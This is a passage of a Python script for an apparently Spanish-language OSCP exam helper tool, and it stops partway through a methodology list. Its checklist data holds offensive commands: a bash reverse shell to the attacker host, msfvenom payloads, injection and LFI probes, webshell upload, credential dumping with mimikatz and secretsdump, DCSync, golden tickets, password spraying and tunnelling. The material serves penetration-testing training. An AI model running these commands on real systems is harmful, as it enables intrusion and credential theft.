#!/usr/bin/env python3
import json
import os
import re
import shutil
import sys
from datetime import datetime
from pathlib import Path

VERSION = "1.0"
BASE = Path.home() / ".oscp-advisor"
SESSIONS = BASE / "sessions"
CURRENT = BASE / "current.json"
NO_COLOR = "--no-color" in sys.argv

R = "\033[0m"
B = "\033[1m"
D = "\033[2m"
U = "\033[4m"
RED = "\033[31m"
GRN = "\033[32m"
YEL = "\033[33m"
BLU = "\033[34m"
MAG = "\033[35m"
CYN = "\033[36m"
WHT = "\033[37m"
BGR = "\033[41m"
BGG = "\033[42m"
BGY = "\033[43m"
BGB = "\033[44m"
BGM = "\033[45m"
BGC = "\033[46m"


def paint(s, code):
    return s if NO_COLOR else str(code) + str(s) + R


def strip_ansi(s):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", s)


def out(s=""):
    print(strip_ansi(s) if NO_COLOR else s)


def width():
    try:
        return max(60, min(shutil.get_terminal_size((100, 24)).columns, 130))
    except Exception:
        return 100


def rule_line(ch="─", code=D):
    out(paint(ch * width(), code))


def title(txt, code=BGC):
    w = width()
    head = " " + txt + " "
    left = max(0, (w - len(head)) // 2)
    out(paint("═" * left, code) + paint(head, code) + paint("═" * (w - left - len(head)), code))


def section(txt, code=BGM):
    out("")
    out(paint("┌─ " + txt + " ", code) + paint("─" * max(0, width() - len(txt) - 5), code))


def sub(txt, code=CYN):
    out(paint("  " + txt, code))


def ok(txt):
    out(paint("  [OK] ", BGG + WHT) + txt)


def warn(txt):
    out(paint("  [!] ", BGY + WHT) + txt)


def bad(txt):
    out(paint("  [!!] ", BGR + WHT) + txt)


def cmdline(txt):
    out(paint("  $ ", BGB + WHT) + paint(txt, CYN))


SEV = {
    "CRITICO": (BGR + WHT, "CRITICO"),
    "ALTO": (RED + B, "ALTO"),
    "MEDIO": (YEL + B, "MEDIO"),
    "BAJO": (GRN + B, "BAJO"),
    "INFO": (BLU + B, "INFO"),
}


def bar(done, total, size=40):
    if total == 0:
        return paint("[" + " " * size + "] 0%", D)
    pct = int(100 * done / total)
    n = int(size * done / total)
    code = GRN if pct >= 70 else (YEL if pct >= 35 else RED)
    return paint("[", D) + paint("█" * n, code) + paint("░" * (size - n), D) + paint("] ", D) + paint(f"{pct:3d}% ({done}/{total})", code)


PHASES = [
    ("P0", "PREPARACION Y SETUP", "🛠️"),
    ("P1", "RECONOCIMIENTO Y DESCUBRIMIENTO", "🔭"),
    ("P2", "ESCANEO DE PUERTOS Y SERVICIOS", "📡"),
    ("P3", "WEB / FUZZING / VULNS", "🌐"),
    ("P4", "ENUMERACION POR SERVICIO", "🔍"),
    ("P5", "FOOTHOLD Y SHELLS", "💥"),
    ("P6", "POST-EXPLOITATION INMEDIATA", "📦"),
    ("P7", "PRIVESC LINUX", "🐧"),
    ("P8", "PRIVESC WINDOWS", "🪟"),
    ("P9", "ACTIVE DIRECTORY", "🏰"),
    ("P10", "PIVOTING Y TUNELES", "🕳️"),
    ("P11", "EVIDENCIAS Y REPORTE", "📝"),
]

CHECKLIST_DATA = [
    ("P0-01", "P0", "Exportar IP objetivo y iniciar log de sesion", "export ip={ip}; script -a oscp_$(date +%F).txt", "script -a"),
    ("P0-02", "P0", "Verificar IP propia y ruta hacia el objetivo", "ip a; ip route; ping -c 2 {ip}", "@ping"),
    ("P0-03", "P0", "Arrancar servidor HTTP de herramientas en puerto 80", "python3 -m http.server 80 -d ~/Tools &", "http.server"),
    ("P0-04", "P0", "Preparar linpeas/winpeas/nc/chisel/pspy en ~/Tools", "ls -la ~/Tools", "linpeas"),
    ("P0-05", "P0", "Anadir FQDN y dominio a /etc/hosts (AD)", "echo '{ip} dc.{domain} {domain} dc' | sudo tee -a /etc/hosts", "domain:"),
    ("P0-06", "P0", "Sincronizar hora con el DC (Kerberos)", "sudo ntpdate -u {ip}", "Clock Skew"),
    ("P0-07", "P0", "Crear estructura de carpetas de salida", "mkdir -p nmap web loot hashes proof", "nmap/"),
    ("P0-08", "P0", "Tabla de credenciales inicializada", "echo 'user,pass,source,service' > creds.csv", "credential"),
    ("P0-09", "P0", "Verificar reglas del examen (MSF 1 maquina, sin sqlmap)", "echo 'MSF: 1 host | Prohibido: sqlmap/comerciales'", "oscp"),
    ("P0-10", "P0", "Cronometro visual / gestion de tiempo por bloque", "date; echo 'Max 2h por maquina'", "date"),

    ("P1-01", "P1", "Identificar sistema operativo por TTL y servicios", "ping -c 1 {ip} | grep -i ttl", "@ping"),
    ("P1-02", "P1", "Whois / informacion pasiva del objetivo", "whois {ip} | grep -iE 'org|country|netname'", "@whois"),
    ("P1-03", "P1", "Resolucion inversa y nombres", "dig -x {ip} +short; nslookup {ip}", "@dig"),
    ("P1-04", "P1", "Transferencia de zona DNS (AXFR)", "dig axfr @{ip} {domain}", "@dig"),
    ("P1-05", "P1", "Enumeracion DNS con dnsrecon", "dnsrecon -d {domain} -n {ip} -t std", "@dnsrecon"),
    ("P1-06", "P1", "Certificados SSL / transparencia", "echo | openssl s_client -connect {ip}:443 2>/dev/null | openssl x509 -noout -text", "@openssl"),
    ("P1-07", "P1", "Detectar hosts vecinos en la subnet", "nxc smb {ip}/24 --gen-hosts-file /tmp/hosts", "nxc smb"),
    ("P1-08", "P1", "OSINT: correos y usuarios publicos", "theHarvester -d {domain} -b all -l 100 -f osint.html", "@theharvester"),
    ("P1-09", "P1", "Guardar todos los nombres encontrados", "grep -iE '^[a-z0-9._-]+@' osint.html | sort -u > users.txt", "@theharvester"),
    ("P1-10", "P1", "Leer pagina web manualmente y ver codigo fuente", "curl -s http://{ip} | head -100", "@curl"),

    ("P2-01", "P2", "Escaneo TCP rapido de todos los puertos", "sudo nmap -Pn -p- --min-rate=1000 -T4 -oN nmap/fast_tcp.txt {ip}", "@nmap"),
    ("P2-02", "P2", "Escaneo UDP top puertos", "sudo nmap -Pn -sU --top-ports=100 -oN nmap/udp.txt {ip}", "@nmap"),
    ("P2-03", "P2", "Extraer lista de puertos abiertos del scan", "grep '^[0-9]' nmap/fast_tcp.txt | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//' > ports.txt", "@nmap"),
    ("P2-04", "P2", "Escaneo dirigido con scripts y versiones", "sudo nmap -A -Pn -sC -sV -p $(cat ports.txt) -oA nmap/targeted {ip}", "@nmap"),
    ("P2-05", "P2", "Escaneo de vulnerabilidades NSE", "sudo nmap -sV -p $(cat ports.txt) --script vuln -oN nmap/vuln.txt {ip}", "@nmap"),
    ("P2-06", "P2", "Escaneo alternativo masscan (verificar)", "sudo masscan -p1-65535 {ip} --rate=1000 -oL nmap/masscan.txt", "@masscan"),
    ("P2-07", "P2", "Revisar TODOS los puertos abiertos uno por uno", "cat nmap/targeted.nmap | grep -E 'open|Service Info'", "@nmap"),
    ("P2-08", "P2", "Identificar servicios en puertos no estandar", "awk '/^[0-9]+\\/(tcp|udp)/{print $1,$3,$4}' nmap/targeted.nmap", "@nmap"),
    ("P2-09", "P2", "Comprobar filtrado / falsos positivos con -sT", "nmap -sT -Pn -p $(cat ports.txt) {ip}", "@nmap"),
    ("P2-10", "P2", "Buscar versiones en exploit-db / searchsploit", "searchsploit 'Apache 2.4.48'", "@searchsploit"),
    ("P2-11", "P2", "Determinar si hay SMB signing (relay)", "nmap --script smb2-security-mode -p445 {ip}", "smb2-security-mode"),
    ("P2-12", "P2", "Detectar si es Domain Controller", "nmap -p88,389,636,3268 -sV {ip}", "@nmap"),

    ("P3-01", "P3", "Fuzz de directorios con feroxbuster", "feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx,jsp,bak -C 404 -t 50", "@feroxbuster"),
    ("P3-02", "P3", "Fuzz de directorios con gobuster", "gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 50", "@gobuster"),
    ("P3-03", "P3", "Fuzz con ffuf y filtro de tamano", "ffuf -u http://{ip}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -fc 404", "@ffuf"),
    ("P3-04", "P3", "Comprobar filenames sensibles", "for f in robots.txt sitemap.xml .git/HEAD .env web.config backup.zip; do curl -s -o /dev/null -w \"$f %{http_code}\\n\" http://{ip}/$f; done", "@curl"),
    ("P3-05", "P3", "Descubrir virtual hosts", "ffuf -u http://{ip}/ -H 'Host: FUZZ.{domain}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0", "@ffuf"),
    ("P3-06", "P3", "Identificar tecnologias con whatweb", "whatweb -v http://{ip}", "@whatweb"),
    ("P3-07", "P3", "Nikto en segundo plano", "nikto -h http://{ip} -o nikto.txt &", "@nikto"),
    ("P3-08", "P3", "Detectar CMS y escanearlo", "wpscan --url http://{ip} --enumerate p --plugins-detection aggressive", "@wpscan"),
    ("P3-09", "P3", "Probar credenciales por defecto en login", "for c in admin:admin admin:password admin:Password1 root:root tomcat:s3cret; do echo $c; done", "login"),
    ("P3-10", "P3", "Probar SQLi manual (sqlmap prohibido en OSCP)", "curl -s 'http://{ip}/page?id=1' 'http://{ip}/page?id=1\\'' 'http://{ip}/page?id=1 OR 1=1-- -'", "sqli"),
    ("P3-11", "P3", "Probar LFI / php filter", "curl -s 'http://{ip}/page?file=../../../../etc/passwd'; curl -s 'http://{ip}/page?file=php://filter/convert.base64-encode/resource=index'", "lfi"),
    ("P3-12", "P3", "Probar SSTI", "for p in '${7*7}' '{{7*7}}' '<%= 7*7 %>'; do curl -s -G --data-urlencode \"q=$p\" http://{ip}/; done", "ssti"),
    ("P3-13", "P3", "Probar inyeccion de comandos", "for p in '; id' '| id' '$(id)' '`id`'; do curl -s -G --data-urlencode \"c=$p\" http://{ip}/; done", "command injection"),
    ("P3-14", "P3", "Verificar metodos HTTP peligrosos", "curl -s -I -X OPTIONS http://{ip}; curl -s -I -X TRACE http://{ip}", "@nmap"),
    ("P3-15", "P3", "Buscar cgi-bin / shellshock", "gobuster dir -u http://{ip}/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,pl,cgi", "@gobuster"),
    ("P3-16", "P3", "Analizar cabeceras y cookies", "curl -sI http://{ip} | grep -iE 'server|x-powered|set-cookie|location'", "@curl"),
    ("P3-17", "P3", "Buscar subdirectorios /api /uploads /admin", "for d in api uploads upload admin phpmyadmin backup; do curl -s -o /dev/null -w \"$d %{http_code}\\n\" http://{ip}/$d/; done", "@ffuf"),
    ("P3-18", "P3", "Si hay upload: probar webshell y extensiones", "curl -s -F 'file=@shell.php' http://{ip}/upload.php", "upload"),
    ("P3-19", "P3", "Revisar certificado SSL por nombres de usuario", "echo | openssl s_client -connect {ip}:443 2>/dev/null | openssl x509 -noout -subject -text | grep -iE 'CN=|email'", "@openssl"),
    ("P3-20", "P3", "Guardar todas las rutas encontradas", "grep -oE '/[A-Za-z0-9_.-]+' web/ffuf.txt | sort -u > web/paths.txt", "@ffuf"),

    ("P4-01", "P4", "SMB: sesion nula y invitado", "nxc smb {ip} -u '' -p '' ; nxc smb {ip} -u guest -p ''", "@smbclient"),
    ("P4-02", "P4", "SMB: listar recursos compartidos", "smbclient -L //{ip}/ -N", "@smbclient"),
    ("P4-03", "P4", "SMB: descargar recursivamente todo", "smbclient //{ip}/{share} -N -c 'recurse;prompt OFF;mget *'", "@smbclient"),
    ("P4-04", "P4", "SMB: enumeracion completa", "enum4linux-ng -A {ip} -oJ enum4linux", "@enum4linux"),
    ("P4-05", "P4", "SMB: mapear shares y permisos", "smbmap -H {ip}", "@smbmap"),
    ("P4-06", "P4", "SMB: buscar vulnus conocidas", "nmap --script 'smb-vuln*' -p445 {ip}", "smb-vuln"),
    ("P4-07", "P4", "LDAP: obtener naming contexts", "ldapsearch -x -H ldap://{ip} -s base namingcontexts", "@ldapsearch"),
    ("P4-08", "P4", "LDAP: volcado anonimo", "ldapsearch -x -H ldap://{ip} -b 'DC={domain},DC=com' '(objectClass=*)' > ldap.txt", "@ldapsearch"),
    ("P4-09", "P4", "LDAP: extraer usuarios con windapsearch", "windapsearch -d {domain} --dc {ip} -U", "@windapsearch"),
    ("P4-10", "P4", "Kerberos: enumerar usuarios con kerbrute", "kerbrute userenum -d {domain} --dc {ip} users.txt", "@kerbrute"),
    ("P4-11", "P4", "Kerberos: AS-REP roast sin credenciales", "impacket-GetNPUsers '{domain}/' -dc-ip {ip} -usersfile users.txt -no-pass", "GetNPUsers"),
    ("P4-12", "P4", "Kerberos: Kerberoasting con creds", "impacket-GetUserSPNs '{domain}/{user}:{pass}' -dc-ip {ip} -request -outputfile spn.txt", "GetUserSPNs"),
    ("P4-13", "P4", "RPC: enumerar usuarios y shares", "rpcclient -U '' -N {ip} -c 'enumdomusers;netshareenumall'", "@rpcclient"),
    ("P4-14", "P4", "SNMP: probar community strings", "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {ip}", "@onesixtyone"),
    ("P4-15", "P4", "SNMP: volcar OIDs utiles de Windows", "snmpwalk -c public -v2c {ip} 1.3.6.1.4.1.77.1.2.25", "@snmpwalk"),
    ("P4-16", "P4", "FTP: intentar anonymous", "ftp {ip}", "@ftp"),
    ("P4-17", "P4", "NFS: ver exports", "showmount -e {ip}", "@showmount"),
    ("P4-18", "P4", "MSSQL: conectar y probar xp_cmdshell", "impacket-mssqlclient {user}@{ip} -windows-auth", "@mssqlclient"),
    ("P4-19", "P4", "MySQL: intentar root sin password", "mysql -h {ip} -u root -e 'SHOW DATABASES;'", "@mysql"),
    ("P4-20", "P4", "Redis: ver configuracion", "redis-cli -h {ip} CONFIG GET dir", "@redis-cli"),
    ("P4-21", "P4", "RDP: verificar credenciales", "xfreerdp /v:{ip} /u:{user} /p:{pass} /cert:ignore +clipboard", "@xfreerdp"),
    ("P4-22", "P4", "WinRM: verificar credenciales", "evil-winrm -i {ip} -u {user} -p '{pass}'", "@evil-winrm"),
    ("P4-23", "P4", "SSH: probar credenciales encontradas", "ssh {user}@{ip}", "@ssh"),
    ("P4-24", "P4", "DNS: intentar AXFR y dnsrecon", "dig axfr @{ip} {domain}; dnsrecon -d {domain} -n {ip}", "@dnsrecon"),

    ("P5-01", "P5", "Buscar exploit publico por version exacta", "searchsploit 'Apache 2.4.48' | grep -iE 'traversal|rce'", "@searchsploit"),
    ("P5-02", "P5", "Leer y adaptar PoC (IP, puerto, path)", "searchsploit -x apache/2.4.x/apache_2.4.48_traversal.py", "@searchsploit"),
    ("P5-03", "P5", "Probar credenciales por defecto en todos los servicios", "nxc smb {ip} -u users.txt -p passes.txt --no-bruteforce", "@nxc"),
    ("P5-04", "P5", "Password spray controlado", "nxc smb {ip}/24 -u users.txt -p 'Password1' --continue-on-success", "@nxc"),
    ("P5-05", "P5", "Preparar listener en puerto 443", "rlwrap nc -lvnp 443", "@nc"),
    ("P5-06", "P5", "Obtener reverse shell Linux", "bash -c 'bash -i >& /dev/tcp/{kali}/443 0>&1'", "reverse shell"),
    ("P5-07", "P5", "Obtener reverse shell Windows", "msfvenom -p windows/x64/shell_reverse_tcp LHOST={kali} LPORT=443 -f exe -o shell.exe", "@msfvenom"),
    ("P5-08", "P5", "Si hay LFI: incluir log de Apache / proc", "curl -s 'http://{ip}/?file=/var/log/apache2/access.log'", "lfi"),
    ("P5-09", "P5", "Si hay upload: localizar webshell subido", "for f in shell.php shell.aspx shell.jsp; do curl -s -o /dev/null -w \"$f %{http_code}\\n\" http://{ip}/uploads/$f; done", "upload"),
    ("P5-10", "P5", "Si hay RCE: ejecutar whoami antes de continuar", "curl -s 'http://{ip}/?c=whoami'", "rce"),
    ("P5-11", "P5", "Verificar arquitectura antes de usar exploit", "uname -m; file /bin/bash; systeminfo | findstr /i 'System Type'", "@systeminfo"),
    ("P5-12", "P5", "Brute force SOLO con usuario conocido", "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4", "@hydra"),

    ("P6-01", "P6", "Estabilizar shell Linux", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; Ctrl+Z; stty raw -echo; fg; export TERM=xterm", "@whoami"),
    ("P6-02", "P6", "Identificarse y capturar evidencia inicial", "whoami; id; hostname; ip a; cat local.txt", "@whoami"),
    ("P6-03", "P6", "Descargar flags", "find / -name 'local.txt' -o -name 'proof.txt' 2>/dev/null", "@find"),
    ("P6-04", "P6", "Subir herramientas desde servidor HTTP", "wget http://{kali}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh", "@wget"),
    ("P6-05", "P6", "Enumerar interfaces y rutas", "ip a; ip route; route print", "@ip"),
    ("P6-06", "P6", "Buscar servicios en localhost", "ss -tulnp; netstat -ano | findstr LISTENING", "@netstat"),
    ("P6-07", "P6", "Buscar credenciales en archivos e historial", "grep -riE 'pass|cred|key' /home /var/www /opt 2>/dev/null | head -50", "@grep"),
    ("P6-08", "P6", "Anadir cada credencial encontrada a la tabla", "echo '{user}:{pass}' >> creds.txt", "credential"),
    ("P6-09", "P6", "Rociar credenciales en TODOS los servicios", "nxc smb {ip}/24 -u users.txt -p passes.txt --continue-on-success", "@nxc"),
    ("P6-10", "P6", "Extraer hashes con secretsdump", "impacket-secretsdump '{domain}/{user}:{pass}'@{ip}", "@secretsdump"),
    ("P6-11", "P6", "Leer /etc/shadow o SAM", "cat /etc/shadow; reg save hklm\\sam sam.save", "@secretsdump"),
    ("P6-12", "P6", "Tras root/admin: repetir reconocimiento completo", "ip a; ss -tulnp; cat /root/.bash_history", "@whoami"),
    ("P6-13", "P6", "Tomar screenshot de evidencia con whoami+flag", "whoami; hostname; ip a; cat /root/proof.txt", "proof.txt"),
    ("P6-14", "P6", "Copiar loot a Kali", "impacket-smbserver smb $(pwd) -smb2support", "@smbserver"),

    ("P7-01", "P7", "Comprobar sudo -l", "sudo -l", "sudo -l"),
    ("P7-02", "P7", "Buscar binarios SUID", "find / -perm -u=s -type f 2>/dev/null", "SUID"),
    ("P7-03", "P7", "Buscar capabilities", "getcap -r / 2>/dev/null", "capabilities"),
    ("P7-04", "P7", "Revisar cron y timers", "cat /etc/crontab; ls -la /etc/cron.*; crontab -l", "cron"),
    ("P7-05", "P7", "Correr pspy para procesos ocultos", "./pspy64 -pf -i 1000", "@pspy"),
    ("P7-06", "P7", "Correr linpeas y filtrar rojo/amarillo", "./linpeas.sh | tee linpeas.txt; grep -A5 '\\[1\\]' linpeas.txt", "@linpeas"),
    ("P7-07", "P7", "Buscar passwords en configuracion", "grep -riE 'password|passwd|secret' /etc /opt /var/www 2>/dev/null | head -50", "password"),
    ("P7-08", "P7", "Buscar claves SSH privadas", "find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null", "id_rsa"),
    ("P7-09", "P7", "Verificar /etc/passwd y /etc/shadow escribibles", "ls -la /etc/passwd /etc/shadow /etc/sudoers.d", "/etc/passwd"),
    ("P7-10", "P7", "Comprobar grupos docker/lxd/adm", "id; getent group docker lxd adm", "docker"),
    ("P7-11", "P7", "Revisar NFS no_root_squash", "cat /etc/exports", "/etc/exports"),
    ("P7-12", "P7", "Buscar archivos world-writable", "find / -xdev -perm -0002 -type f 2>/dev/null | head -50", "writable"),
    ("P7-13", "P7", "Aprovechar GTFOBins", "echo 'https://gtfobins.github.io' ; sudo -l | grep -oE '/[a-z/]+' ", "gtfobins"),
    ("P7-14", "P7", "Kernel como ultimo recurso", "uname -a; ./linux-exploit-suggester.sh", "@linux-exploit-suggester"),
    ("P7-15", "P7", "Revisar .bash_history y variables de entorno", "cat ~/.bash_history; env | grep -iE 'pass|key|token'", ".bash_history"),
    ("P7-16", "P7", "Buscar archivos .git con secretos", "find / -name '.git' -type d 2>/dev/null", ".git"),
    ("P7-17", "P7", "Verificar sudo version vulnerable", "sudo --version | head -2; searchsploit sudo 1.9", "sudo"),
    ("P7-18", "P7", "Comprobar PAM / polkit / dbus", "dpkg -l | grep -iE 'polkit|dbus'; pkexec --version", "polkit"),

    ("P8-01", "P8", "Identificar tipo de shell CMD o PowerShell", "echo %CD%; $PSVersionTable", "@powershell"),
    ("P8-02", "P8", "whoami /all y privilegios", "whoami /all", "@whoami"),
    ("P8-03", "P8", "Correr winpeas en modo cmd y guardar", "winpeas.exe cmd > C:\\Windows\\Temp\\winpeas.txt", "@winpeas"),
    ("P8-04", "P8", "Filtrar hallazgos de winpeas", "grep -iE 'SeImpersonate|Unquoted|Modifiable|AlwaysInstall|AutoLogon' winpeas.txt", "@winpeas"),
    ("P8-05", "P8", "Servicios con ruta sin comillas", "wmic service get name,pathname,startmode | findstr /i 'auto'", "unquoted"),
    ("P8-06", "P8", "Servicios modificables", "sc qc nombre_servicio; accesschk.exe -uwcqv usuario *", "Modifiable"),
    ("P8-07", "P8", "Credenciales guardadas cmdkey", "cmdkey /list", "@cmdkey"),
    ("P8-08", "P8", "Historial de PowerShell", "type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "ConsoleHost_history"),
    ("P8-09", "P8", "AlwaysInstallElevated", "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "AlwaysInstallElevated"),
    ("P8-10", "P8", "Copias SAM/SYSTEM", "dir C:\\Windows\\Repair\\SAM; reg save hklm\\sam C:\\Windows\\Temp\\sam.save", "Repair\\SAM"),
    ("P8-11", "P8", "Tareas programadas modificables", "schtasks /query /fo LIST /v | findstr /i 'Task To Run'", "@schtasks"),
    ("P8-12", "P8", "DLL hijacking por PATH writable", "echo %PATH%; $env:PATH -split ';'", "DLL hijack"),
    ("P8-13", "P8", "Token impersonation / potato attacks", "PrintSpoofer.exe -i -c cmd; GodPotato-NET4.exe -cmd 'cmd /c whoami'", "SeImpersonate"),
    ("P8-14", "P8", "UAC bypass si es administrador", "whoami /groups | findstr 'Mandatory'; fodhelper.exe", "fodhelper"),
    ("P8-15", "P8", "Buscar passwords en archivos", "findstr /si 'password' *.txt *.xml *.ini *.config", "@findstr"),
    ("P8-16", "P8", "Unattend.xml y web.config", "type C:\\Windows\\Panther\\unattend.xml; type C:\\inetpub\\wwwroot\\web.config", "unattend"),
    ("P8-17", "P8", "Registry con passwords", "reg query HKLM /f password /t REG_SZ /s", "@reg"),
    ("P8-18", "P8", "Mimikatz / LSASS", "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit", "@mimikatz"),
    ("P8-19", "P8", "Carpeta AppData oculta", "Get-ChildItem C:\\Users\\*\\AppData -Recurse -Include *.xml,*.config -Force -EA SilentlyContinue | Select-String password -List", "AppData"),
    ("P8-20", "P8", "Bases de datos locales (MySQL/MSSQL)", ".\\mysql.exe -u root -e 'SHOW DATABASES;'", "@mysql"),

    ("P9-01", "P9", "Obtener primer usuario de dominio", "nxc smb {ip} -u users.txt -p passes.txt --continue-on-success", "@nxc"),
    ("P9-02", "P9", "BloodHound: recoleccion inicial", "sharpHound.exe -c All --zipfilename bloodhound.zip", "@sharphound"),
    ("P9-03", "P9", "BloodHound: subir datos y ver shortest paths", "neo4j console & bloodhound &", "@bloodhound"),
    ("P9-04", "P9", "BloodHound: sesiones de usuarios privilegiados", "MATCH p=(c:Computer)-[:HasSession]->(m:User) RETURN p", "@bloodhound"),
    ("P9-05", "P9", "Enumerar usuarios del dominio", "net user /domain; Get-ADUser -Filter * | select SamAccountName", "@net"),
    ("P9-06", "P9", "Enumerar equipos del dominio", "net group 'Domain Computers' /domain", "@net"),
    ("P9-07", "P9", "Leer TODOS los shares, primero los no default", "nxc smb {ip} -u {user} -p '{pass}' --shares", "@nxc"),
    ("P9-08", "P9", "Buscar GPP cpassword en SYSVOL", "smbclient //{ip}/SYSVOL -U {user} -c 'recurse;prompt OFF;mget *'; find . -name 'Groups.xml'", "SYSVOL"),
    ("P9-09", "P9", "Descifrar GPP cpassword", "gpp-decrypt 'cpassword_value'", "@gpp-decrypt"),
    ("P9-10", "P9", "AS-REP Roasting", "impacket-GetNPUsers '{domain}/' -dc-ip {ip} -usersfile users.txt -no-pass", "GetNPUsers"),
    ("P9-11", "P9", "Kerberoasting", "impacket-GetUserSPNs '{domain}/{user}:{pass}' -dc-ip {ip} -request", "GetUserSPNs"),
    ("P9-12", "P9", "Crackear tickets/hashes", "hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt", "@hashcat"),
    ("P9-13", "P9", "Password spraying con politica", "nxc smb {ip} -u users.txt -p 'Password1' --continue-on-success", "@nxc"),
    ("P9-14", "P9", "Responder / LLMNR si no hay creds", "sudo responder -I tun0 -A", "@responder"),
    ("P9-15", "P9", "ADCS: buscar plantillas vulnerables", "certipy-ad find -u {user} -p '{pass}' -dc-ip {ip} -vulnerable -stdout", "@certipy"),
    ("P9-16", "P9", "Delegacion y ACLs desde BloodHound", "MATCH p=(u:User)-[:GenericAll|WriteDacl|ForceChangePassword]->(n) RETURN p", "@bloodhound"),
    ("P9-17", "P9", "Abuso de ACL: shadow credentials / ForceChangePassword", "pywhisker -d {domain} -u {user} -p '{pass}' --target targetuser", "@pywhisker"),
    ("P9-18", "P9", "Pass-the-Hash a otra maquina", "nxc smb {ip} -u {user} -H {hash} --local-auth", "@nxc"),
    ("P9-19", "P9", "Overpass-the-Hash / Pass-the-Ticket", "impacket-getTGT '{domain}/{user}' -hashes :{hash}", "@getTGT"),
    ("P9-20", "P9", "Silver / Golden Ticket", "impacket-ticketer -nthash {hash} -domain-sid S-1-5-21-... -domain {domain} administrator", "@ticketer"),
    ("P9-21", "P9", "Secretsdump tras admin local", "impacket-secretsdump '{domain}/{user}:{pass}'@{ip}", "@secretsdump"),
    ("P9-22", "P9", "DCSync para sacar hash de Administrator", "impacket-secretsdump -just-dc-user Administrator '{domain}/{user}:{pass}'@{ip}", "@secretsdump"),
    ("P9-23", "P9", "Compromiso del DC / proof.txt", "evil-winrm -i {ip} -u administrator -H {hash}", "@evil-winrm"),
    ("P9-24", "P9", "Repetir ciclo con cada credencial nueva", "echo 'cred -> enum -> privesc -> dump -> spray'", "credential"),
    ("P9-25", "P9", "Verificar SMB signing antes de intentar relay", "nmap --script smb2-security-mode -p445 {ip}", "smb2-security-mode"),

    ("P10-01", "P10", "Detectar segunda interfaz en la victima", "ip a; ipconfig /all", "eth1"),
    ("P10-02", "P10", "Iniciar chisel server reverse en Kali", "./chisel server -p 9999 --reverse &", "@chisel"),
    ("P10-03", "P10", "Conectar chisel desde la victima", "./chisel client {kali}:9999 R:socks", "@chisel"),
    ("P10-04", "P10", "Configurar proxychains", "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf", "@proxychains"),
    ("P10-05", "P10", "Escanear red interna a traves del tunel", "proxychains -q nmap -sT -Pn -p80,445,5985,3389 {ip}", "@proxychains"),
    ("P10-06", "P10", "Reenviar servicio localhost de la victima", "./chisel client {kali}:9999 R:9090:127.0.0.1:8080", "@chisel"),
    ("P10-07", "P10", "Alternativa ligolo-ng", "sudo ./tun0 & ./agent -connect {kali}:11601", "@ligolo"),
    ("P10-08", "P10", "Alternativa SSH -L / -D", "ssh -N -R 1080 user@{kali}", "@ssh"),
    ("P10-09", "P10", "Verificar tunel con curl", "proxychains -q curl -I http://{ip}", "@proxychains"),
    ("P10-10", "P10", "Volver a fase 1 sobre la nueva subnet", "proxychains -q nmap -sT -Pn -p- {ip}", "@proxychains"),

    ("P11-01", "P11", "Screenshot de whoami + hostname + IP + flag", "whoami; hostname; ip a; cat proof.txt", "proof.txt"),
    ("P11-02", "P11", "Screenshot en Windows con ; no &&", "whoami; hostname; ipconfig; type C:\\Users\\Administrator\\Desktop\\proof.txt", "proof.txt"),
    ("P11-03", "P11", "Guardar todos los comandos ejecutados", "cat oscp_$(date +%F).txt", "script -a"),
    ("P11-04", "P11", "Documentar cada hallazgo con comando y salida", "echo '## Hallazgo' >> reporte.md", "reporte"),
    ("P11-05", "P11", "Mapear hallazgos a MITRE ATT&CK", "echo 'T1595 T1190 T1068 T1021 T1003'", "MITRE"),
    ("P11-06", "P11", "Incluir remediación por hallazgo", "echo 'Parchear / restringir / monitorizar' >> reporte.md", "remediacion"),
    ("P11-07", "P11", "Verificar que todas las flags fueron capturadas", "ls -la proof/", "proof.txt"),
    ("P11-08", "P11", "Exportar este checklist desde oscp-advisor", "opcion 9 del menu", "checklist"),
]

METHODOLOGIES = [
    ("OSCP End-to-End (Heretek 2026 + Zhaoyi-Fan)", "10 fases, command-first, disenada para examen PEN-200", [
        ("Fase 0 Setup", "export IP, log con script, servidor HTTP de herramientas, /etc/hosts y ntpdate si hay AD.", ["export ip={ip}; script -a oscp_$(date +%F).txt", "python3 -m http.server 80 -d ~/Tools &"]),
        ("Fase 1 Enumeration", "Tres scans en paralelo: TCP rapido, UDP top, y escaneo dirigido con -sC -sV.", ["sudo nmap -Pn -p- --min-rate=1000 -T4 -oN fast_tcp.txt {ip}", "sudo nmap -A -Pn -sC -sV -p $(cat ports.txt) -oA targeted {ip}"]),
        ("Fase 2 Web", "Fuzz, tecnologia, CMS, credenciales por defecto, parametros (SQLi/LFI/RCE/SSTI), upload.", ["feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -C 404 -t 50"]),
        ("Fase 3 Foothold", "Exploit publico, credenciales reutilizadas, web exploit, bruteforce solo con usuario conocido.", ["searchsploit 'Apache 2.4.48'", "rlwrap nc -lvnp 443"]),
        ("Fase 4 Post-exploitation", "Estabilizar shell, screenshot, flags, herramientas, interfaces, servicios locales, loot y spray.", ["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "find / -name 'local.txt' -o -name 'proof.txt' 2>/dev/null"]),
